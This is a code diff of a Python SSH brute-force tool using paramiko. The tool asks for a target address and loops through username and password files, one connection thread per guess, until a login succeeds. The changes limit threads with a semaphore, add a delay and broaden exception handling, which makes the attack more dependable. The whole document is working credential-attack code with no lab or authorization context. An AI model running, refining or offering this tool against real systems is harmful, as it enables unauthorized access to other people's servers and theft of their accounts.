@@ -2,6 +2,8 @@ import paramiko, sys, os, termcolor
 import threading, time
 
 stop_flag = False
+max_threads = 5  # Número máximo de hilos simultáneos
+thread_limiter = threading.BoundedSemaphore(max_threads)
 
 def ssh_connect(username, password):
     global stop_flag
@@ -11,13 +13,15 @@ def ssh_connect(username, password):
         ssh.connect(host, port=22, username=username, password=password)
         stop_flag = True
         print(termcolor.colored(('[+] Found Password: ' + password + ', For Account: ' + username), 'green'))
-    except paramiko.ssh_exception.AuthenticationException as e:
+    except paramiko.ssh_exception.AuthenticationException:
         print(termcolor.colored(('[-] Incorrect Password: ' + password + ', For Account: ' + username), 'red'))
-    
-    #except:
-    #    pass
-        #print(termcolor.colored(('[-] Incorrect Password: ' + password + ', For Account: ' + username), 'red'))
-    #ssh.close()
+    except paramiko.ssh_exception.SSHException as e:
+        print(termcolor.colored(('[-] SSH Exception: ' + str(e)), 'red'))
+    except Exception as e:
+        print(termcolor.colored(('[-] Connection Failed: ' + str(e)), 'red'))
+    finally:
+        ssh.close()
+        thread_limiter.release()
 
 host = input('[+] Target Address: ')
 usernames_file = "usernames.txt"
@@ -28,7 +32,7 @@ if os.path.exists(passwords_file) == False:
     print('[!!] That File/Path Doesnt Exist')
     sys.exit(1)
 
-print('* * * Starting Threaded SSH Bruteforce On ' + host + ' With Account: ' + usernames_file + '* * *') 
+print('* * * Starting Threaded SSH Bruteforce On ' + host + ' With Account: ' + usernames_file + ' * * *') 
 
 with open(usernames_file, 'r') as users:
     for username in users:
@@ -38,12 +42,14 @@ with open(usernames_file, 'r') as users:
                 password = password.strip()
                 if stop_flag:
                     break
+                thread_limiter.acquire()
                 t = threading.Thread(target=ssh_connect, args=(username, password))
                 t.start()
-                time.sleep(0)
+                time.sleep(0.5)  # Ajusta el tiempo de espera según sea necesario
                 if stop_flag:
                     break
         if stop_flag:
             break
+
 
 
